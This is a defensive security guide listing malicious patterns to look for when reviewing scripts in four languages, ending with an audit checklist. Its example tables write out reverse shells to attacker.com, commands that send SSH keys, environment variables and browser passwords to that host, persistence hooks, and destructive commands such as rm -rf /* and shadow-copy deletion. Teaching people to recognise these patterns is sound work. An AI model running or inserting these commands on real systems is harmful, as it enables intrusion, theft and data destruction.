# Script Security Audit: Common Malicious Patterns

This document outlines key attack vectors and code patterns to look for when reviewing Bash, PowerShell, Python, and Node.js scripts before local execution.

## 1. Persistence & Auto-Start

- **Goal:** Ensuring the script survives reboots or user logouts.
- **Patterns to watch:** Modifying startup files, registry keys, or cron jobs.

| Language | Malicious Pattern Example |
| --- | --- |
| Bash | echo "@reboot /tmp/.hidden_script &" >> ~/.bashrc |
| PowerShell | Register-ScheduledTask -TaskName "Update" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c '...'") |
| Python | os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malicious /t REG_SZ /d "C:\\path\\to\\script.py"') |
| Node.js | require('child_process').exec('echo "* * * * * /usr/bin/node /tmp/malicious.js" >> /var/spool/cron/root') |

## 2. Remote Access (Reverse Shells)

- **Goal:** Granting an attacker interactive command-line access to your machine.
- **Patterns to watch:** Use of network sockets, /dev/tcp, or redirection of shell input/output.

| Language | Malicious Pattern Example |
| --- | --- |
| Bash | bash -i >& /dev/tcp/attacker.com/4444 0>&1 |
| PowerShell | $c=New-Object System.Net.Sockets.TCPClient("attacker.com",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){...;iex $line} |
| Python | s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/bash","-i"]) |
| Node.js | var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);net.connect(4444,"attacker.com",function(){this.pipe(sh.stdin);sh.stdout.pipe(this)}) |

## 3. Data Exfiltration

- **Goal:** Stealing SSH keys, environment variables, browser passwords, or private documents.
- **Patterns to watch:** Recursive file searches, reading from .ssh or .env, and POST requests to unknown URLs.

| Language | Malicious Pattern Example |
| --- | --- |
| Bash | find ~/.ssh -name "id_*" -exec curl -F "file=@{}" http://attacker.com \; |
| PowerShell | $data = Get-ChildItem Env: \| Out-String; Invoke-RestMethod -Uri "http://attacker.com" -Method Post -Body $data |
| Python | [requests.post('http://attacker.com', data=open(f).read()) for f in glob.glob("**/.env", recursive=True)] |
| Node.js | const data = fs.readFileSync('/path/to/chrome/Default/Login Data'); require('http').request('http://attacker.com', {method:'POST'}).write(data); |

## 4. Defense Evasion (Obfuscation)

- **Goal:** Hiding the script's true intent from human eyes and security scanners.
- **Patterns to watch:** Base64 encoding, hex strings, eval(), and iex (Invoke-Expression).

| Language | Malicious Pattern Example |
| --- | --- |
| Bash | echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHR...=" |
| PowerShell | powershell.exe -EncodedCommand JABjID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQuLi4= |
| Python | import base64; exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzIC1sYScp")) |
| Node.js | eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC1sYScp", "base64").toString()) |

## 5. System Impact & Destruction

- **Goal:** Locking the user out, deleting data, or making the OS unusable.
- **Patterns to watch:** Commands that delete system directories, disable UAC, or wipe recovery backups.

| Language | Malicious Pattern Example |
| --- | --- |
| Bash | rm -rf /* 2>/dev/null |
| PowerShell | vssadmin delete shadows /all /quiet; Set-ItemProperty -Path 'HKLM:\...\System' -Name 'EnableLUA' -Value 0 |
| Python | [os.rename(f, f + ".locked") for f in os.listdir('.') if os.path.isfile(f)] |
| Node.js | require('fs').writeFileSync('/etc/shadow', 'root:*:12345:0:99999:7:::'); |

## Audit Checklist Summary

- **Check for obscure strings:** Are there large blocks of Base64 or hex?
- **Check network activity:** Does it call curl, requests, http, or net.connect to an unfamiliar IP/domain?
- **Check file access:** Does it touch sensitive folders like ~/.ssh, ~/.aws, or browser profile paths?
- **Check privileges:** Does the script ask for sudo or modify registry/system configs?
- **Verify origin:** Does the script come from a verified repository on GitHub or a trusted source?